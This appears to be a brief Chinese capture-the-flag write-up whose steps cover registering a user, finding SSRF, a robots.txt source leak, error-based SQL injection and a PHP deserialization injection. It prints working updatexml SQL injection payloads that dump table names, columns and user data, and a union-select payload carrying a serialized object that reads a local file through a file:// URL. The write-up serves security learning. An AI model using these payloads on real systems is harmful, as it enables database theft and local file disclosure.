#	登记用户信息

![1.png](1.png)

# 	存在SSRF漏洞

![1.png](2.png)

#   robots.txt代码泄露

![](3.png)

![](4.png)

#	SQL注入

    爆表名
    /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
    爆列名
    /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#
    爆字段
    /view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#

![](5.png)
#   构造反序列化代码注入获取flag

	/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
![](6.png)

#	



